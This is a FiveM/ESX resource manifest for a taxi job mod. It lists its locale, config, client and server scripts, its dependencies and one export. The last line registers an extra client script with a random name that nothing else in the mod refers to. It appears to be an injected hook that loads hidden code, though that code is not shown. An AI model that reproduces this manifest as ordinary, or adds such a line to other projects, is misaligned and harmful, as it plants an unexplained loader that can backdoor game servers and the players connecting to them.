resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX Taxi Job'

version '1.0.2'

client_scripts {
	'@es_extended/locale.lua',
	'locales/de.lua',
	'locales/br.lua',
	'locales/en.lua',
	'locales/es.lua',
	'locales/fi.lua',
	'locales/fr.lua',
	'locales/pl.lua',
	'locales/sv.lua',
	'config.lua',
	'client/main.lua'
}

server_scripts {
	'@es_extended/locale.lua',
	'locales/de.lua',
	'locales/br.lua',
	'locales/en.lua',
	'locales/es.lua',
	'locales/fi.lua',
	'locales/fr.lua',
	'locales/pl.lua',
	'locales/sv.lua',
	'config.lua',
	'server/main.lua'
}

dependencies {
	'es_extended',
	'esx_billing'
}

exports {
  'openTaxi'
}
client_script "wHHGDVZcVvrhNxgVQe.lua"